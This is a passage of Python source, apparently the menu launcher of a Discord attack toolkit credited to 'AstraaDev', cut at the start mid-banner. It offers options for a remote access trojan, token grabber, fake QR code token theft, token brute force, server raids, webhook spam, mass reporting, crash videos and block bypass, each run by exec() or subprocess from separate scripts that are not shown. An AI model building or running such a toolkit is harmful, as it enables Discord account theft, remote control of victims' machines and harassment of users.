    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def discordrat():
    print(f"""\n\n                    {b}██████{y}╗ {b}██{y}╗{b}███████{y}╗ {b}██████{y}╗ {b}██████{y}╗ {b}██████{y}╗ {b}██████{y}╗     {b}██████{y}╗  {b}█████{y}╗ {b}████████{y}╗""")
    print(f"""                    {b}██{y}╔══{b}██{y}╗{b}██{y}║{b}██{y}╔════╝{b}██{y}╔════╝{b}██{y}╔═══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗    {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗╚══{b}██{y}╔══╝""")
    print(f"""                    {b}██{y}║  {b}██{y}║{b}██{y}║{b}███████{y}╗{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██████{y}╔╝{b}██{y}║  {b}██{y}║    {b}██████{y}╔╝{b}███████{y}║   {b}██{y}║   """)
    print(f"""                    {b}██{y}║  {b}██{y}║{b}██{y}║╚════{b}██{y}║{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}║  {b}██{y}║    {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║   {b}██{y}║   """)
    print(f"""                    {b}██████{y}╔╝{b}██{y}║{b}███████{y}║╚{b}██████{y}╗╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║{b}██████{y}╔╝    {b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║   {b}██{y}║   """)
    print(f"""                    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   \n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")


def main():
    os.system('cls')
    Spinner()
    os.system('cls')
    astraahome()
    print(f"""        {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Main Options:          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Token Options:          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Gen/Checker Options:        {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Other Options:\n""")
    print(f"""            {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }01{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } RAT Tool              {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }06{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Token Grabber          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }12{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Nitro                      {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }14{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } ByPass Block\n""")
    print(f"""            {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }02{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Raid Tool             {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }07{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } FakeQrCode             {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }13{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Token                      {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }15{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Credits\n""")
    print(f"""            {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }03{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } VideoCrash Maker      {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }08{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Token BrutForce                                        {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }16{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Exit\n""")
    print(f"""            {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }04{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Massive Report        {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }09{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Token Rape\n""")
    print(f"""            {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }05{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } WebHooks Spam         {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }10{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Token Informations\n""")
    print(f"""                                       {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }11{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } AutoLogin\n\n""")
    global choice
    choice = input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Choice: """)


    if choice == '1' or choice == '01':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/1_Rat/rat.py').read())

    elif choice == '2' or choice == '02':
        os.system('cls')
        Spinner()
        os.system('cls')
        script_name = 'Additional_File/2_Raid/raid.py'
        cmd_line = [sys.executable, script_name]
        subprocess.check_call(cmd_line)

    elif choice == '3' or choice == '03':
        os.system('cls')
        Spinner()
        os.system('cls')
        subprocess.call([r'Additional_File\\3_VidCrashMaker\\crashvideomaker.bat'])

    elif choice == '4' or choice == '04':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/4_MassReport/massreport.py').read())

    elif choice == '5' or choice == '05':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/5_WebhookSpam/webhookspam.py').read())

    elif choice == '6' or choice == '06':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/6_TokenGrab/tokengrabber.py').read())

    elif choice == '7' or choice == '07':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/7_TokenFakeQr/fakeqr.py').read())
        
    elif choice == '8' or choice == '08':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/8_TokenBrutForce/brutforcetoken.py').read())
    
    elif choice == '9' or choice == '09':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/9_TokenRape/tokenrape.py').read())

    elif choice == '10':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/10_TokenInfo/tokeninfo.py').read())
        
    elif choice == '11':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/11_AutoLogin/autologin.py').read())

    elif choice == '12':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/12_NitroGen/nitrogen.py').read())

    elif choice == '13':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/13_TokenGen/tokengen.py').read())

    elif choice == '14':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/14_ByPassBlock/blockbypass.py').read())
        
    elif choice == '15':
        os.system('cls')
        Spinner()
        os.system('cls')
        astraahome()
        print(f"""                                            {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Development Networks:\n""")
        print(f"""                                                {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } GitHub:    @AstraaDev""")
        print(f"""                                                {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } WebSite:   astraadev.club""")
        print(f"""                                                {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Server:    discord.gg/pUZrFnabvd\n\n""")
        print(f"""                                            {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Other Networks:\n""")
        print(f"""                                                {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Twitter:   @AstraaDev""")
        print(f"""                                                {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Discord:   Astraa#4589""")
        print(f"""                                                {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Insta:     @astraaftn\n\n\n""")
        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTBLUE_EX } Press ENTER to exit""")
        sys.exit()
            
    elif choice == '16':
        os.system('cls')
        Spinner()
        os.system('cls')
        astraahome()
        print(f"""                                                {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }❤{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Have a good day :)""")
        print(f"""{Fore.LIGHTRED_EX }
                                              ,ad8PPPP88b,     ,d88PPPP8ba,
                                             d8P"      "Y8b, ,d8P"      "Y8b
                                            dP'           "8a8"           `Yd
                                            8(              "              )8
                                            I8                             8I
                                             Yb,                         ,dP
                                              "8a,                     ,a8"
                                                "8a,                 ,a8"
                                                  "Yba             adP"
                                                    `Y8a         a8P'
                                                      `88,     ,88'
                                                        "8b   d8"
                                                         "8b d8"
                                                          `888'""")
        time.sleep(3)
        sys.exit()

    else:
        os.system('cls')
        main()

main()